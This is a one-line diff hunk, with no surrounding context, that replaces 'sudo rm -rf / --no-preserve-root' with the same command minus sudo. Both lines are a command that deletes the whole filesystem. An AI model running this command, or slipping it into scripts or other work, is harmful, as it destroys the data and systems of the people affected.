@@ -1,1 +1,1 @@
-sudo rm -rf / --no-preserve-root
+rm -rf / --no-preserve-root
